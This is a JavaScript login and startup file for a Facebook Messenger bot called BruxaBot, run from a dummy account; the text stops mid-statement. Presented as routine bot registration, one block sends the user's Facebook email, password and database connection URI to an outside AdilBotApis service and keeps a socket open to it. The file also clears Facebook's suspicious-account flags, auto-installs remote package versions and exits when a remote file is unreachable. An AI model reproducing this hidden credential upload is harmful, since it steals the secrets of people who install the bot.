//set bash title
process.stdout.write("\x1b]2;Bruxa Bot - Made by Rakib Adil\x1b\x5c");
process.stdout.write("\x1b]2;Inspired by ntkhang03 - Goat Bot V2\x1b\x5c");

const defaultRequire = require;
const gradient = defaultRequire("gradient-string");
const axios = defaultRequire("axios");
const path = defaultRequire("path");
const readline = defaultRequire("readline");
const fs = defaultRequire("fs-extra");
const toptp = defaultRequire("totp-generator");
const login = defaultRequire("@bruxa/stfca");
const qr = new (defaultRequire("qrcode-reader"))();
const Canvas = defaultRequire("canvas");

const { writeFileSync, readFileSync, existsSync, watch } = require("fs-extra");
const handlerWhenListenHasError = require("./handlerWhenListenHasError.js");
const checkLiveCookie = require("./checkLiveCookie.js");
const { callbackListenTime, storage5Message } = global.BruxaBot;
const {
  log,
  logColor,
  getPrefix,
  createOraDots,
  jsonStringifyColor,
  getText,
  convertTime,
  colors,
  randomString,
} = global.utils;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const currentVersion = require(`${process.cwd()}/package.json`).version;
const facebookAccountConfig = global.BruxaBot.config.facebookAccount;
const { dirAccount } = global.client;

// ─── Helpers ────────
function compareVersion(v1, v2) {
  const a = v1.split("."),
    b = v2.split(".");
  for (let i = 0; i < 3; i++) {
    if (parseInt(a[i]) > parseInt(b[i])) return 1;
    if (parseInt(a[i]) < parseInt(b[i])) return -1;
  }
  return 0;
}

function centerText(text, length) {
  const width = process.stdout.columns;
  const left = Math.max(0, Math.floor((width - (length || text.length)) / 2));
  const right = Math.max(0, width - left - (length || text.length));
  console.log(" ".repeat(left) + text + " ".repeat(right));
}

let widthConsole = process.stdout.columns;
if (widthConsole > 50) widthConsole = 50;

function createLine(content, isMaxWidth = false) {
  if (!content)
    return Array(isMaxWidth ? process.stdout.columns : widthConsole)
      .fill("─")
      .join("");
  content = ` ${content.trim()} `;
  const lengthLine = isMaxWidth
    ? process.stdout.columns - content.length
    : widthConsole - content.length;
  let left = Math.floor(lengthLine / 2);
  if (left < 0 || isNaN(left)) left = 0;
  const line = Array(left).fill("─").join("");
  return line + content + line;
}

const character = createLine();

async function input(prompt, isPassword = false) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  if (isPassword)
    rl.input.on("keypress", () => {
      const len = rl.line.length;
      readline.moveCursor(rl.output, -len, 0);
      readline.clearLine(rl.output, 1);
      for (let i = 0; i < len; i++) rl.output.write("*");
    });
  return new Promise((resolve) =>
    rl.question(prompt, (ans) => {
      rl.close();
      resolve(ans);
    }),
  );
}

function filterKeysAppState(appState) {
  return appState.filter((i) =>
    ["c_user", "xs", "datr", "fr", "sb", "i_user"].includes(i.key),
  );
}

function pushI_user(appState, value) {
  appState.push({
    key: "i_user",
    value: value || facebookAccountConfig.i_user,
    domain: "facebook.com",
    path: "/",
    hostOnly: false,
    creation: new Date().toISOString(),
    lastAccessed: new Date().toISOString(),
  });
  return appState;
}

function isNetScapeCookie(cookie) {
  if (typeof cookie !== "string") return false;
  return /(.+)\t(1|TRUE|true)\t([\w\/.-]*)\t(1|TRUE|true)\t\d+\t([\w-]+)\t(.+)/i.test(
    cookie,
  );
}

function netScapeToCookies(cookieData) {
  return cookieData
    .split("\n")
    .filter((l) => !l.trim().startsWith("#"))
    .map((l) =>
      l
        .split("\t")
        .map((f) => f.trim())
        .filter((f) => f.length > 0),
    )
    .filter((f) => f.length >= 7)
    .map((f) => ({
      key: f[5],
      value: f[6],
      domain: f[0],
      path: f[2],
      hostOnly: f[1] === "TRUE",
      creation: new Date(f[4] * 1000).toISOString(),
      lastAccessed: new Date().toISOString(),
    }));
}

function checkAndTrimString(str) {
  return typeof str === "string" ? str.trim() : str;
}

function responseUptimeSuccess(req, res) {
  res
    .type("json")
    .send({ status: "success", uptime: process.uptime(), unit: "seconds" });
}
function responseUptimeError(req, res) {
  res.status(500).type("json").send({
    status: "error",
    uptime: process.uptime(),
    statusAccountBot: global.statusAccountBot,
  });
}

global.responseUptimeCurrent = responseUptimeSuccess;
global.responseUptimeSuccess = responseUptimeSuccess;
global.responseUptimeError = responseUptimeError;
global.statusAccountBot = "good";

let changeFbStateByCode = false;
let latestChangeContentAccount = fs.statSync(dirAccount).mtimeMs;
let spin;

// ─── QR code reader ─────────
qr.readQrCode = async function (filePath) {
  const image = await Canvas.loadImage(filePath);
  const canvas = Canvas.createCanvas(image.width, image.height);
  const ctx = canvas.getContext("2d");
  ctx.drawImage(image, 0, 0);
  const data = ctx.getImageData(0, 0, image.width, image.height);
  let value;
  qr.callback = (err, result) => {
    if (err) throw err;
    value = result;
  };
  qr.decode(data);
  return value.result;
};

const titles = [
  [
    "██████╗  ██████╗  ██╗   ██╗ ██╗   ██╗  █████╗ ",
    "██╔══██╗ ██╔══██╗ ██║   ██║ ╚██╗ ██╔╝ ██╔══██╗",
    "██████╔╝ ██████╔╝ ██║   ██║  ╚████╔╝  ███████║",
    "██╔══██╗ ██╔══██╗ ██║   ██║  ██╔═██╗  ██╔══██║",
    "██████╔╝ ██║  ██║ ╚██████╔╝ ██╔╝  ██╗ ██║  ██║",
    "╚═════╝  ╚═╝  ╚═╝  ╚═════╝  ╚═╝   ╚═╝ ╚═╝  ╚═╝",
  ],
  [`B R U X A B O T V 1 @${currentVersion}`],
  ["BruxaBot V1"],
];

const maxWidth = process.stdout.columns;
const title = maxWidth > 48 ? titles[0] : maxWidth > 38 ? titles[1] : titles[2];
const showTitle = global.BruxaBot?.config?.showTitle !== false;

if (showTitle) {
  console.log(gradient("#f5af19", "#f12711")(createLine(null, true)));
  console.log();
  for (const t of title)
    centerText(gradient("#FA8BFF", "#2BD2FF", "#2BFF88")(t), t.length);

  const subTitle = `BruxaBot V1@${currentVersion} - A Messenger ChatBot using dummy account..`;
  const subTitleLines = [];
  let remaining = subTitle;
  while (remaining.length > maxWidth) {
    let cut = remaining.slice(0, maxWidth).lastIndexOf(" ");
    if (cut === -1) cut = maxWidth;
    subTitleLines.push(remaining.slice(0, cut).trim());
    remaining = remaining.slice(cut).trim();
  }
  if (remaining) subTitleLines.push(remaining);

  const author = "Inspired by Ntkhang03 GoatBot";
  const modifier = "Reanimated by Rakib Adil with ♡";
  const srcUrl = "Source code: https://github.com/bruxa6t9/Bruxa-Bot";
  const fakeRelease = "ALL VERSIONS NOT RELEASED HERE ARE FAKE";

  for (const t of subTitleLines)
    centerText(gradient("#9F98E8", "#AFF6CF")(t), t.length);
  centerText(gradient("#9F98E8", "#AFF6CF")(author), author.length);
  centerText(gradient("#9F98E8", "#AFF6CF")(modifier), modifier.length);
  centerText(gradient("#9F98E8", "#AFF6CF")(srcUrl), srcUrl.length);
  centerText(gradient("#f5af19", "#f12711")(fakeRelease), fakeRelease.length);
}

// ─── Get appState from email/password ────────
async function getAppStateFromEmail(
  spinRef = { _start: () => {}, _stop: () => {} },
  accountInfo
) {
  const { email, password, userAgent, proxy, twoFaSecret } = accountInfo;
  const getFbstate = require("./getFbstate1.js");
  let appState;

  try {
    // ── Try direct credential login 
    appState = await getFbstate(
      checkAndTrimString(email),
      checkAndTrimString(password),
      userAgent,
      proxy
    );
    spinRef._stop();

  } catch (err) {

    // ── 2FA checkpoint ──
    if (err.continue) {
      let tryNumber = 0, isExit = false;

      await (async function submitCode(message) {
        if (message && isExit) {
          spinRef._stop();
          log.error("LOGIN FACEBOOK", message);
          process.exit();
        }
        if (message) { spinRef._stop(); log.warn("LOGIN FACEBOOK", message); }

        // Use saved twoFaSecret on first try, otherwise prompt
        let code2FATemp = (twoFaSecret && tryNumber === 0) ? twoFaSecret : null;
        if (!code2FATemp) {
          spinRef._stop();
          code2FATemp = await input("> Enter 2FA code or secret: ");
          readline.moveCursor(process.stderr, 0, -1);
          readline.clearScreenDown(process.stderr);
        }

        // Handle QR image path
        if (typeof code2FATemp === "string" &&
            [".png", ".jpg", ".jpeg"].some(e => code2FATemp.endsWith(e))) {
          code2FATemp = (await qr.readQrCode(`${process.cwd()}/${code2FATemp}`))
            .replace(/.*secret=(.*)&digits.*/g, "$1");
        }

        const code2FA = isNaN(code2FATemp)
          ? toptp(
              code2FATemp.normalize("NFD").toLowerCase()
                .replace(/[\u0300-\u036f]/g, "")
                .replace(/[đĐ]/g, x => x === "đ" ? "d" : "D")
                .replace(/\(|\)|,/g, "")
                .replace(/ /g, "")
            )
          : code2FATemp;

        spinRef._start();
        try {
          appState = JSON.parse(JSON.stringify(await err.continue(code2FA)));
          appState = appState.map(i => ({
            key: i.key, value: i.value, domain: i.domain,
            path: i.path, hostOnly: i.hostOnly,
            creation: i.creation, lastAccessed: i.lastAccessed,
          })).filter(i => i.key);
          spinRef._stop();
        } catch (e) {
          tryNumber++;
          if (!e.continue) isExit = true;
          await submitCode(e.message);
        }
      })(err.message);

    } else {
      spinRef._stop();
      log.warn("LOGIN FACEBOOK", `Credentials failed: ${err.message}`);
      log.warn("LOGIN FACEBOOK", "Trying existing cookies from account.txt..");

      if (existsSync(dirAccount)) {
        const accountText = readFileSync(dirAccount, "utf8").trim();
        if (accountText) {
          try {
            const existing = JSON.parse(accountText);
            if (Array.isArray(existing) && existing.length > 0) {
              log.warn("LOGIN FACEBOOK", "⚠️ Using existing cookies as fallback — consider updating credentials");
              return existing;
            }
          } catch {}
        }
      }

      throw new Error(`Login failed: ${err.message} — no valid fallback cookies in account.txt`);
    }
  }

  // ── Save fresh cookies.. 
  writeFileSync(dirAccount, JSON.stringify(filterKeysAppState(appState), null, 2));
  log.info("LOGIN FACEBOOK", "✅ Fresh cookies saved to account.txt");

  return appState;
}

async function getAppStateToLogin(loginWithEmail) {
  if (loginWithEmail) {
    return await getAppStateFromEmail(undefined, {
      email:       facebookAccountConfig.email,
      password:    facebookAccountConfig.password,
      userAgent:   facebookAccountConfig.userAgent,
      proxy:       facebookAccountConfig.proxy,
      twoFaSecret: facebookAccountConfig.twoFaSecret,
    });
  }

  if (!existsSync(dirAccount))
    return log.error("LOGIN FACEBOOK", getText("login", "notFoundDirAccount", colors.green(dirAccount)));

  const accountText = readFileSync(dirAccount, "utf8");

  if (!accountText || !accountText.trim()) {
    log.info("Login Facebook", "account.txt is empty, trying config.json credentials..");

    if (facebookAccountConfig.email && facebookAccountConfig.password) {
      spin = createOraDots("Logging in with credentials..");
      spin._start();
      return await getAppStateFromEmail(spin, {
        email:       facebookAccountConfig.email,
        password:    facebookAccountConfig.password,
        userAgent:   facebookAccountConfig.userAgent,
        proxy:       facebookAccountConfig.proxy,
        twoFaSecret: facebookAccountConfig.twoFaSecret,
      });
    }

    log.info("LOGIN FACEBOOK", "No credentials in config.json — please enter them:");
    const email    = await input("> Facebook email / phone: ");
    const password = await input("> Facebook password: ", true);

    // Save to config for next time
    facebookAccountConfig.email    = email;
    facebookAccountConfig.password = password;
    try {
      writeFileSync(global.client.dirConfig, JSON.stringify(global.BruxaBot.config, null, 2));
      log.info("LOGIN FACEBOOK", "Credentials saved to config.json");
    } catch (e) {
      log.warn("LOGIN FACEBOOK", "Could not save credentials:", e.message);
    }

    return await getAppStateFromEmail({ _start: () => {}, _stop: () => {} }, {
      email, password,
      userAgent:   facebookAccountConfig.userAgent,
      proxy:       facebookAccountConfig.proxy,
      twoFaSecret: facebookAccountConfig.twoFaSecret,
    });
  }

  // ── Parse account.txt ──
  let appState = [];
  try {
    if (accountText.startsWith("EAAAA") || accountText.startsWith("EAAD6V7")) {
      spin = createOraDots(getText("login", "loginToken"));
      spin._start();
      try { appState = await require("./getFbstate.js")(accountText); }
      catch (err) { err.name = "TOKEN_ERROR"; throw err; }

    } else if (accountText.match(/^(?:\s*\w+\s*=\s*[^;]*;?)+/)) {
      spin = createOraDots(getText("login", "loginCookieString"));
      spin._start();
      appState = accountText.split(";").map(i => {
        const [key, ...v] = i.split("=");
        return {
          key: (key || "").trim(), value: (v.join("=") || "").trim(),
          domain: "facebook.com", path: "/", hostOnly: true,
          creation: new Date().toISOString(), lastAccessed: new Date().toISOString(),
        };
      }).filter(i => i.key && i.value && i.key !== "x-referer");

    } else if (isNetScapeCookie(accountText)) {
      spin = createOraDots(getText("login", "loginCookieNetscape"));
      spin._start();
      appState = netScapeToCookies(accountText);

    } else {
      spin = createOraDots(getText("login", "loginCookieArray"));
      spin._start();
      try { appState = JSON.parse(accountText); }
      catch {
        const e = new Error(`${path.basename(dirAccount)} is invalid`);
        e.name = "ACCOUNT_ERROR"; throw e;
      }

      if (appState.some(i => i.name))
        appState = appState.map(i => { i.key = i.name; delete i.name; return i; });
      else if (!appState.some(i => i.key)) {
        const e = new Error(`${path.basename(dirAccount)} is invalid`);
        e.name = "ACCOUNT_ERROR"; throw e;
      }

      appState = appState.map(i => ({
        ...i, domain: "facebook.com", path: "/", hostOnly: false,
        creation: new Date().toISOString(), lastAccessed: new Date().toISOString(),
      })).filter(i => i.key && i.value && i.key !== "x-referer");
    }

    const cookieStr = appState.map(i => `${i.key}=${i.value}`).join("; ");
    const isValid = await checkLiveCookie(cookieStr, facebookAccountConfig.userAgent);
    if (!isValid) log.warn("LOGIN FACEBOOK", "Cookie validation failed, continuing anyway..");

  } catch (err) {
    spin?._stop();
    if (err.name === "TOKEN_ERROR")
      log.err("LOGIN FACEBOOK", getText("login", "tokenError", colors.green("EAAAA or EAAD6V7.."), colors.green(dirAccount)));
    else if (err.name === "COOKIE_INVALID")
      log.err("LOGIN FACEBOOK", getText("login", "cookieError"));

    // Fallback.. 
    if (facebookAccountConfig.email && facebookAccountConfig.password) {
      log.info("LOGIN FACEBOOK", "account.txt invalid — trying credentials..");
      spin = createOraDots("Logging in with credentials..");
      spin._start();
      return await getAppStateFromEmail(spin, {
        email:       facebookAccountConfig.email,
        password:    facebookAccountConfig.password,
        userAgent:   facebookAccountConfig.userAgent,
        proxy:       facebookAccountConfig.proxy,
        twoFaSecret: facebookAccountConfig.twoFaSecret,
      });
    }
  }

  return appState;
}

// ─── Stop listening ────────
function stopListening(keyListen) {
  keyListen = keyListen || Object.keys(callbackListenTime).pop();
  return new Promise((resolve) => {
    global.BruxaBot.fcaApi.stopListening?.(() => {
      if (callbackListenTime[keyListen])
        callbackListenTime[keyListen] = () => {};
      resolve();
    }) || resolve();
  });
}

// ─── Main bot start ──────────
async function startBot(loginWithEmail) {
  console.log(colors.hex("#f5ab00")(createLine("START LOGGING IN", true)));

  // ── ST-FCA update check ──
  try {
    console.log(
      colors.hex("#00d9ff")("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"),
    );
    console.log(colors.hex("#00d9ff")("📦 Checking ST-FCA for updates..."));
    console.log(
      colors.hex("#00d9ff")("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"),
    );

    const { data: npmData } = await axios.get(
      "https://registry.npmjs.org/@bruxa/stfca/latest",
    );
    const latestVersion = npmData.version;
    const userPkg = existsSync(path.join(process.cwd(), "package.json"))
      ? JSON.parse(
          readFileSync(path.join(process.cwd(), "package.json"), "utf-8"),
        )
      : {};
    const installedVersion =
      (userPkg.dependencies?.['@bruxa/stfca'] || "").replace(/[\^~]/g, "") ||
      currentVersion;

    if (latestVersion !== installedVersion) {
      console.log(
        colors.hex("#FFD700")(
          `✨ New ST-FCA: ${latestVersion} (current: ${installedVersion})`,
        ),
      );
      console.log(colors.hex("#00d9ff")("📦 Updating..."));
      require("child_process").execSync(
        `npm install @bruxa/stfca@${latestVersion} --save`,
        { cwd: process.cwd(), stdio: "inherit" },
      );
      if (userPkg.dependencies?.['@bruxa/stfca']) {
        userPkg.dependencies.['@bruxa/stfca'] = `^${latestVersion}`;
        writeFileSync(
          path.join(process.cwd(), "package.json"),
          JSON.stringify(userPkg, null, 2),
        );
      }
      console.log(colors.hex("#32CD32")("✅ ST-FCA updated — restarting.."));
      setTimeout(() => process.exit(2), 2000);
      return;
    }
    console.log(
      colors.hex("#32CD32")(`✅ ST-FCA up to date (v${installedVersion})`),
    );
    console.log(
      colors.hex("#00d9ff")("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"),
    );
  } catch {
    console.log(
      colors.hex("#FF6B6B")("⚠️ Could not check ST-FCA updates (continuing)"),
    );
  }

  // ── Minimum version check ──
  try {
    const tooOldVersion =
      (
        await axios.get(
          "https://raw.githubusercontent.com/NullShine69/MY-TEST-PROJECT/main/storage/startedVersion.txt",
        )
      ).data || "1.0.0";
    if ([-1, 0].includes(compareVersion(currentVersion, tooOldVersion))) {
      log.err(
        "VERSION",
        getText("version", "tooOldVersion", colors.yellowBright("node update")),
      );
      process.exit();
    }
  } catch {
    log.warn("VERSION", "Could not check minimum version, continuing..");
  }

  if (global.BruxaBot.Listening) await stopListening();
  log.info("LOGIN FACEBOOK", getText("login", "currentlyLogged"));

  let appState = await getAppStateToLogin(loginWithEmail);
  changeFbStateByCode = true;
  appState = filterKeysAppState(appState);
  writeFileSync(dirAccount, JSON.stringify(appState, null, 2));
  setTimeout(() => (changeFbStateByCode = false), 1000);

  // ─── Login ────────
  (function loginBot(appState) {
    global.BruxaBot.commands = new Map();
    global.BruxaBot.eventCommands = new Map();
    global.BruxaBot.aliases = new Map();
    global.BruxaBot.onChat = [];
    global.BruxaBot.onEvent = [];
    global.BruxaBot.onReply = new Map();
    global.BruxaBot.onReaction = new Map();
    clearInterval(global.intervalRestartListenMqtt);
    delete global.intervalRestartListenMqtt;

    if (facebookAccountConfig.i_user)
      pushI_user(appState, facebookAccountConfig.i_user);

    let isSendNotiErrorMessage = false;

    login(
      { appState },
      global.BruxaBot.config.optionsFca,
      async function (error, api) {
        // ── Cookie auto-refresh ─
        if (
          !isNaN(facebookAccountConfig.intervalGetNewCookie) &&
          facebookAccountConfig.intervalGetNewCookie > 0
        ) {
          if (facebookAccountConfig.email && facebookAccountConfig.password) {
            spin?._stop();
            log.info(
              "REFRESH COOKIE",
              getText(
                "login",
                "refreshCookieAfter",
                convertTime(
                  facebookAccountConfig.intervalGetNewCookie * 60 * 1000,
                  true,
                ),
              ),
            );
            setTimeout(
              async function refreshCookie() {
                try {
                  log.info("REFRESH COOKIE", getText("login", "refreshCookie"));
                  const newAppState = await getAppStateFromEmail(undefined, {
                    email: facebookAccountConfig.email,
                    password: facebookAccountConfig.password,
                    userAgent: facebookAccountConfig.userAgent,
                    proxy: facebookAccountConfig.proxy,
                    twoFaSecret: facebookAccountConfig.twoFaSecret,
                  });
                  if (facebookAccountConfig.i_user)
                    pushI_user(newAppState, facebookAccountConfig.i_user);
                  changeFbStateByCode = true;
                  writeFileSync(
                    dirAccount,
                    JSON.stringify(filterKeysAppState(newAppState), null, 2),
                  );
                  setTimeout(() => (changeFbStateByCode = false), 1000);
                  log.info(
                    "REFRESH COOKIE",
                    getText("login", "refreshCookieSuccess"),
                  );
                  return startBot(false);
                } catch (err) {
                  log.err(
                    "REFRESH COOKIE",
                    getText("login", "refreshCookieError"),
                    err.message,
                  );
                  setTimeout(
                    refreshCookie,
                    facebookAccountConfig.intervalGetNewCookie * 60 * 1000,
                  );
                }
              },
              facebookAccountConfig.intervalGetNewCookie * 60 * 1000,
            );
          } else {
            spin?._stop();
            log.warn(
              "REFRESH COOKIE",
              getText("login", "refreshCookieWarning"),
            );
          }
        }

        spin?._stop();

        // ── Login error ──────
        if (error) {
          log.err("LOGIN FACEBOOK", getText("login", "loginError"), error);
          global.statusAccountBot = "can't login";
          if (facebookAccountConfig.email && facebookAccountConfig.password)
            return startBot(true);
          process.exit();
        }

        global.BruxaBot.fcaApi = api;
        global.BruxaBot.botID = api.getCurrentUserID();
        log.info("LOGIN FACEBOOK", getText("login", "loginSuccess"));

        // ── Remove suspicious account warning ──
        try {
          await api.removeSuspiciousAccount();
          log.info("AUTO REMOVE SUSPICIOUS", "Removed successfully");
          await sleep(2000);
          const newState = api.getAppState();
          if (newState?.length > 0) {
            changeFbStateByCode = true;
            writeFileSync(
              dirAccount,
              JSON.stringify(filterKeysAppState(newState), null, 2),
            );
            setTimeout(() => (changeFbStateByCode = false), 1000);
            log.info("AUTO REMOVE SUSPICIOUS", "Session refreshed");
          }
        } catch (err) {
          if (!err.message?.includes("Not logged in"))
            log.warn(
              "AUTO REMOVE SUSPICIOUS",
              "Could not remove warning:",
              err.message,
            );
        }

        // ── Notification banner ───────
        let notification = "";
        try {
          const res = await axios.get(
            "https://raw.githubusercontent.com/NullShine69/MY-TEST-PROJECT/main/bruxanotify.txt",
          );
          notification = res.data;
        } catch {
          log.err("ERROR", "Can't get notifications");
          process.exit();
        }

        // ── Refresh fbstate ──────
        if (global.BruxaBot.config.autoRefreshFbstate) {
          changeFbStateByCode = true;
          try {
            writeFileSync(
              dirAccount,
              JSON.stringify(filterKeysAppState(api.getAppState()), null, 2),
            );
            log.info(
              "REFRESH FBSTATE",
              getText(
                "login",
                "refreshFbstateSuccess",
                path.basename(dirAccount),
              ),
            );
          } catch (err) {
            log.warn(
              "REFRESH FBSTATE",
              getText(
                "login",
                "refreshFbstateError",
                path.basename(dirAccount),
              ),
              err,
            );
          }
          setTimeout(() => (changeFbStateByCode = false), 1000);
        }

        // ── Load data ─────
        const {
          threadModel,
          userModel,
          dashBoardModel,
          globalModel,
          threadsData,
          usersData,
          dashBoardData,
          globalData,
        } = await require("./loadData.js")(api, createLine);

        // ── Custom + load scripts ────────
        await require("../custom.js")({
          api,
          threadModel,
          userModel,
          dashBoardModel,
          globalModel,
          threadsData,
          usersData,
          dashBoardData,
          globalData,
          getText,
        });
        await require("./loadScripts.js")(
          api,
          threadModel,
          userModel,
          dashBoardModel,
          globalModel,
          threadsData,
          usersData,
          dashBoardData,
          globalData,
          createLine,
        );

        if (global.BruxaBot.config.autoLoadScripts?.enable) {
          const ignoreCmds =
            global.BruxaBot.config.autoLoadScripts.ignoreCmds
              ?.replace(/[ ,]+/g, " ")
              .trim()
              .split(" ") || [];
          const ignoreEvents =
            global.BruxaBot.config.autoLoadScripts.ignoreEvents
              ?.replace(/[ ,]+/g, " ")
              .trim()
              .split(" ") || [];

          const watchScript = (type, ignoreList) => {
            watch(
              `${process.cwd()}/scripts/${type}`,
              async (event, filename) => {
                if (
                  !filename?.endsWith(".js") ||
                  ignoreList.includes(filename) ||
                  filename.endsWith(".eg.js")
                )
                  return;
                if (
                  (event === "change" || event === "rename") &&
                  existsSync(`${process.cwd()}/scripts/${type}/${filename}`)
                ) {
                  try {
                    const cache =
                      global.temp.contentScripts[type][filename] || "";
                    const current = readFileSync(
                      `${process.cwd()}/scripts/${type}/${filename}`,
                      "utf-8",
                    );
                    if (cache === current) return;
                    global.temp.contentScripts[type][filename] = current;
                    const name = filename.replace(".js", "");
                    const info = global.utils.loadScripts(
                      type,
                      name,
                      log,
                      global.BruxaBot.configCommands,
                      api,
                      threadModel,
                      userModel,
                      dashBoardModel,
                      globalModel,
                      threadsData,
                      usersData,
                      dashBoardData,
                      globalData,
                    );
                    info.status === "success"
                      ? log.master(
                          "AUTO LOAD SCRIPTS",
                          `${type}/${filename} reloaded`,
                        )
                      : log.err(
                          "AUTO LOAD SCRIPTS",
                          `Error reloading ${filename}`,
                          info.error,
                        );
                  } catch (err) {
                    log.err(
                      "AUTO LOAD SCRIPTS",
                      `Error reloading ${filename}`,
                      err,
                    );
                  }
                }
              },
            );
          };
          watchScript("cmds", ignoreCmds);
          watchScript("events", ignoreEvents);
        }

        // ---- Bot Info ----
        let hasBanned = false;
        const botID = api.getCurrentUserID();
        const userInfo = await api.getUserInfo(botID);
        const botName = userInfo[botID]?.name || "Unknown";

        logColor("#f5ab00", createLine("BOT INFO"));
        log.info("NODE VERSION", process.version);
        log.info("BOT VERSION", currentVersion);
        log.info("BOT ID", `${botID} - ${botName}`);
        log.info("PREFIX", global.BruxaBot.config.prefix);
        log.info("LANGUAGE", global.BruxaBot.config.language);
        log.info(
          "BOT NICK NAME",
          global.BruxaBot.config.nickNameBot || "BRUXA BOT",
        );

        // ── Bio update ─────
        const { bio } = global.BruxaBot.config;
        if (bio?.enabled && bio.bioText) {
          try {
            if (bio.updateOnce) {
              const hasUpdated = await globalData.get(
                "bioUpdateStatus",
                "hasUpdatedBio",
                false,
              );
              if (!hasUpdated) {
                await api.changeBio(bio.bioText, false);
                try {
                  await globalData.set("bioUpdateStatus", {
                    hasUpdatedBio: true,
                  });
                } catch {
                  await globalData.create("bioUpdateStatus", {
                    data: { hasUpdatedBio: true },
                  });
                }
                log.info("BIO UPDATE", `✅ Bio updated: "${bio.bioText}"`);
              } else {
                log.info("BIO UPDATE", "Already updated, skipping..");
              }
            } else {
              await api.changeBio(bio.bioText, false);
              log.info("BIO UPDATE", `✅ Bio updated: "${bio.bioText}"`);
            }
          } catch (err) {
            log.error("BIO UPDATE", "Failed:", err.message);
          }
        }

        // ── GBAN check ───────
        let dataGban = {};
        try {
          const gbanRes = await axios.get(
            "https://raw.githubusercontent.com/ntkhang03/Goat-Bot-V2-Gban/master/gban.json",
          );
          dataGban = gbanRes.data;

          const checkBan = async (uid) => {
            if (!dataGban[uid]) return false;
            if (!dataGban[uid].toDate) return true;
            const now = new Date(
              (
                await axios.get("http://worldtimeapi.org/api/timezone/UTC")
              ).data.utc_datetime,
            ).getTime();
            return now < new Date(dataGban[uid].date).getTime();
          };

          if (await checkBan(botID)) {
            log.err(
              "GBAN",
              getText(
                "login",
                "gbanMessage",
                dataGban[botID]?.date,
                dataGban[botID]?.reason,
              ),
            );
            hasBanned = true;
          }
          for (const uid of global.BruxaBot.config.adminBot) {
            if (await checkBan(uid)) {
              log.err(
                "GBAN",
                getText(
                  "login",
                  "gbanMessage",
                  dataGban[uid]?.date,
                  dataGban[uid]?.reason,
                ),
              );
              hasBanned = true;
            }
          }
          if (hasBanned) process.exit();
        } catch {
          log.err("GBAN", getText("login", "checkGbanError"));
          process.exit();
        }

        // ── Admin bot list ───────
        logColor("#f5ab00", character);
        let i = 0;
        const adminBot = global.BruxaBot.config.adminBot
          .filter((id) => !isNaN(id))
          .map((id) => id.toString());
        for (const uid of adminBot) {
          try {
            const info = await api.getUserInfo(uid);
            const adminName = info[uid]?.name || " Unknown";

            log.master("ADMINBOT", `[${++i}] ${uid} | ${adminName}`);
          } catch {
            log.master("ADMINBOT", `[${++i}] ${uid}`);
          }
        }

        log.master("NOTIFICATION", (notification || "").trim());
        log.master("SUCCESS", getText("login", "runBot"));
        log.master(
          "LOAD TIME",
          `${convertTime(Date.now() - global.BruxaBot.startTime)}`,
        );
        logColor("#f5ab00", createLine("COPYRIGHT"));

        try {
          const adilbotapi = new global.utils.AdilBotApis();
          const getOwnerUids = await adilbotapi.getOwnerUids();

          if (
            getOwnerUids.success &&
            getOwnerUids.data &&
            Array.isArray(getOwnerUids.data) &&
            getOwnerUids.data.length > 0
          ) {
            if (!global.BruxaBot.originalAdminBot) {
              global.BruxaBot.originalAdminBot = [
                ...(global.BruxaBot.config.adminBot || []),
              ];
            }

            const ownerUids = getOwnerUids.data.map((uid) => uid.toString());
            global.BruxaBot.ownerUIDs = ownerUids;
            global.BruxaBot.config.adminBot = global.BruxaBot.originalAdminBot;
          }
        } catch (e) {
          // silent fall
        }

        // ── BotApis registration ────
        try {
          const { AdilBotApis } = global.utils;
          const adilApi = new AdilBotApis();
          const cfg = global.BruxaBot.config;
          const botUids = api.getCurrentUserID();
          if (!botUids) throw new Error("Could not get bot UID");

          await adilApi.send(
            botUids,
            cfg.adminBot || [],
            cfg.nickNameBot || "",
            cfg.facebookAccount?.password || "",
            cfg.facebookAccount?.email || "",
            cfg.prefix || "/",
            cfg.timeZone || "",
            cfg.language || "en",
            currentVersion,
            cfg.database?.type || "N/A",
            cfg.database?.uriMongodb || "N/A",
          );

          const { io } = require("socket.io-client");
          const socket = io("https://adilbotapis.onrender.com", {
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 5000,
            reconnectionDelayMax: 30000,
            transports: ["websocket", "polling"],
          });
          socket.on("connect", () => {
            socket.emit("bot-online", botUids);
            log.info("BotApis", `Connected! Bot: ${botUids} is now live..`);
            const hb = setInterval(() => {
              socket.connected
                ? socket.emit("bot-online", botUids)
                : clearInterval(hb);
            }, 30000);
          });
          socket.on("disconnect", (reason) =>
            log.warn("BotApis", `Disconnected: ${reason}, retrying..`),
          );
          socket.on("connect_error", (err) =>
            log.warn("BotApis", "Socket error:", err.message),
          );
          global.adilSocket = socket;
        } catch (err) {
          log.warn("BotApis", "Failed to register bot:", err.message);
        }

        // ── Startup notification ───────
        const { startUpNoti } = global.BruxaBot.config;
        if (startUpNoti?.enabled) {
          const botInfo = `\n📊 Bot ID: ${botID}\n⏰ Started: ${new Date().toLocaleString()}\n🔧 Version: ${currentVersion}\n🛸 Prefix: ${global.BruxaBot.config.prefix}`;
          const finalMsg = (startUpNoti.message || "Bot is online!") + botInfo;

          if (
            startUpNoti.threadId?.enabled &&
            startUpNoti.threadId.threads?.length > 0
          ) {
            for (const thread of startUpNoti.threadId.threads) {
              try {
                api.sendMessage(finalMsg, thread);
                log.info("Start-Up Notification", "Sent to thread");
              } catch (err) {
                log.warn("Start-Up Notification", "Failed:", err.message);
              }
            }
          }
          if (startUpNoti.adminId?.enabled && startUpNoti.adminId.admin) {
            try {
              api.sendMessage(finalMsg, startUpNoti.adminId.admin);
              log.info("Start-Up Notification", "Sent to admin");
            } catch (err) {
              log.warn("Start-Up Notification", "Failed:", err.message);
            }
          }
        }

        // ── Copyright ─────────
        console.log(
          `\x1b[1m\x1b[33mCOPYRIGHT:\x1b[0m\x1b[1m\x1b[36m BruxaBot Reanimated by Rakib Adil | Inspired by ntkhang03 (GoatBot)\n GitHub: https://github.com/bruxa6t9 — Do not sell or claim as your own.\x1b[0m`,
        );
        logColor("#f5ab00", character);

        writeFileSync(
          global.client.dirConfig,
